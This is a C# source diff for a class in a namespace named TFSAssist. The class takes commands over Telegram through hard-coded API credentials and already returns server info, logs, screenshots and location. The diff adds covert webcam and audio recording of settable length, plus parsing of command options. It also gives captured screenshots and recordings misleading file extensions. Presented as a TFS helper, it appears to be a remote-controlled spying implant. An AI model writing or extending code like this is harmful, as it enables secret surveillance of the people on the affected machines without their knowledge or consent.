@@ -34,6 +34,8 @@ namespace TFSAssist
         private string ClientID = string.Empty;
         private TTLControl _control;
 
+        private CamCapture _camCapture;
+
         private GeoCoordinateWatcher _watcher;
         private string _locationResult = string.Empty;
         private bool _tryGetLocation = false;
@@ -53,9 +55,16 @@ namespace TFSAssist
             ClientID = clientId;
             TempDirectory = Path.Combine(ASSEMBLY.ApplicationDirectory, "Temp");
 
-            _watcher = new GeoCoordinateWatcher();
-            _watcher.StatusChanged += _watcher_StatusChanged;
-            _watcher.Start();
+            try
+            {
+                _watcher = new GeoCoordinateWatcher();
+                _watcher.StatusChanged += _watcher_StatusChanged;
+                _watcher.Start();
+            }
+            catch (Exception)
+            {
+
+            }
         }
 
         private async void _watcher_StatusChanged(object sender, GeoPositionStatusChangedEventArgs e)
@@ -87,6 +96,16 @@ namespace TFSAssist
                 _control = new TTLControl(770122, "8bf0b952100c9b22fd92499fc329c27e");
                 await _control.ConnectAsync();
                 IsEnabled = true;
+
+                try
+                {
+                    // сделаем отдельную проверку на создании CamCapture, т.к. все зависит от IIS если она поддерживает ту платформу на которой была сбилдена прога, то будет работать, иначе нет. Но все остальное должно проинититься, в случае чего можно будет сделать исправление посмотрев логи
+                    _camCapture = new CamCapture();
+                }
+                catch (Exception ex)
+                {
+                    WriteExLog(ex, false);
+                }
 
                 await Task.Delay(5000);
 
@@ -155,8 +174,20 @@ namespace TFSAssist
                 {
                     if (tlMessage.Message.StartsWith(isCommand, StringComparison.CurrentCultureIgnoreCase))
                     {
-                        string message = tlMessage.Message.Substring(isCommand.Length, tlMessage.Message.Length - isCommand.Length).ToLower().Trim();
-                        switch (message)
+                        string command = tlMessage.Message.Substring(isCommand.Length, tlMessage.Message.Length - isCommand.Length);
+                        Dictionary<string, string> options = null;
+                        int optStart = command.IndexOf('(');
+                        int optEnd = command.IndexOf(')');
+                        if (optStart != -1 && optEnd != -1 && optEnd > optStart)
+                        {
+                            string strOptions = command.Substring(optStart, command.Length - optStart);
+                            options = ReadOptionParams(strOptions);
+                            command = command.Substring(0, optStart);
+                        }
+                        command = command.ToLower().Trim();
+
+
+                        switch (command)
                         {
                             case "info":
                                 await SendMessageToCurrentUser(GetCurrentServerInfo(true));
@@ -194,7 +225,10 @@ namespace TFSAssist
                             case "log":
                                 string logs = _getLogs?.Invoke();
                                 if (logs.IsNullOrEmptyTrim())
+                                {
+                                    await SendMessageToCurrentUser("Log is empty.");
                                     break;
+                                }
 
                                 await SaveFile(Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.log"), logs);
 
@@ -218,7 +252,7 @@ namespace TFSAssist
                                 break;
 
                             case "screen":
-                                string imagePath = Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.png");
+                                string imagePath = Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.pam");
                                 await ScreenCapture.CaptureAsync(imagePath, ImageFormat.Png);
                                 break;
 
@@ -237,7 +271,41 @@ namespace TFSAssist
                                     await SendMessageToCurrentUser(_locationResult);
                                     _tryGetLocation = false;
                                 }
+                                break;
 
+                            case "caminfo":
+                                if (_camCapture == null)
+                                {
+                                    await SendMessageToCurrentUser($"Cam not initialized.");
+                                    break;
+                                }
+
+                                await SendMessageToCurrentUser($"Cam settings: TimeRec=[60] Video=[{string.Join("];[", _camCapture.VideoEncoders)}] Audio=[{string.Join("];[", _camCapture.AudioEncoders)}]");
+                                break;
+
+                            case "cam":
+                                if (_camCapture == null)
+                                {
+                                    await SendMessageToCurrentUser($"Cam not initialized.");
+                                    break;
+                                }
+
+                                int timeRec = 60;
+                                string video = null;
+                                string audio = null;
+                                if (options != null && options.Count > 0)
+                                {
+                                    if (options.TryGetValue("TimeRec", out var timeRecStr))
+                                        int.TryParse(timeRecStr, out timeRec);
+                                    options.TryGetValue("Video", out video);
+                                    options.TryGetValue("Audio", out audio);
+                                }
+
+                                string videoPath = Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.bam");
+                                if (!await _camCapture.StartRec(videoPath, timeRec, video, audio))
+                                {
+                                    await SendMessageToCurrentUser($"Can't init cam. Settings: Video=[{string.Join("];[", _camCapture.VideoEncoders)}] Audio=[{string.Join("];[", _camCapture.AudioEncoders)}]");
+                                }
                                 break;
                         }
                     }
@@ -295,6 +363,63 @@ namespace TFSAssist
             }
         }
 
+
+        Dictionary<string, string> ReadOptionParams(string options)
+        {
+            Dictionary<string, string> optParams = new Dictionary<string, string>(StringComparer.CurrentCultureIgnoreCase);
+            StringBuilder builderParam = new StringBuilder();
+            StringBuilder builderValue = new StringBuilder();
+            int findParams = 0;
+            int findValue = 0;
+
+            foreach (char ch in options)
+            {
+                if (ch == '(' && findParams == 0)
+                {
+                    findParams++;
+                    continue;
+                }
+
+                if (ch == ')' && (findValue == 0 || findValue == 3) && findParams > 0)
+                {
+                    findParams--;
+                    continue;
+                }
+
+                if (findParams <= 0)
+                    continue;
+
+                if ((ch == '=' && findValue == 0) || (ch == '\'' && findValue >= 1))
+                {
+                    findValue++;
+                    continue;
+                }
+
+                if (ch == ',' && findValue == 3)
+                {
+                    findValue = 0;
+                    optParams.Add(builderParam.ToString(), builderValue.ToString());
+                    builderParam.Clear();
+                    builderValue.Clear();
+                    continue;
+                }
+
+                if (findValue == 2)
+                {
+                    builderValue.Append(ch);
+                    continue;
+                }
+
+                if (!char.IsWhiteSpace(ch) && findValue == 0)
+                    builderParam.Append(ch);
+            }
+
+            optParams.Add(builderParam.ToString(), builderValue.ToString());
+            builderParam.Clear();
+            builderValue.Clear();
+
+            return optParams;
+        }
 
         async Task SaveFile(string destination, string data)
         {
